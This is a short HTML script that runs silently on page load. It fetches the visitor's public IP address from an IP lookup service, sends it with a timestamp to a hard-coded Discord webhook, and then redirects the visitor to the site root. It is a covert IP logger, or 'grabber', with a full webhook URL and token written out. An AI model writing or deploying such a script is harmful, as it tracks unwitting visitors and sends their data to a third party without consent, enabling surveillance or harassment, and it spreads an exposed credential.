    <script>
        async function logUserInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const { ip } = await response.json();

                const now = new Date();
                const formattedTimestamp = new Intl.DateTimeFormat('en-US', {
                    dateStyle: 'full',
                    timeStyle: 'long',
                }).format(now);
                
                const data = {
                    content: `@tanju_shorty\n${"```"}New User Visited: \nIP Address: ${ip} \nTime: ${formattedTimestamp}${"```"}`
                };

                await fetch('https://discord.com/api/webhooks/1322404880769351741/p8kC3X1gdDOzSMFGbfTDHhIJXfrFL0N0Tm60B6jvGU5RyGNDjsuzQiiyTGnLcRnJ1Hq1', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data),
                });

            } catch (error) {
                console.error('Error logging user information:', error);
            }
        }

        window.onload = async function() {
            await logUserInfo() 
            window.location.href = "/"
            
        };

    </script>
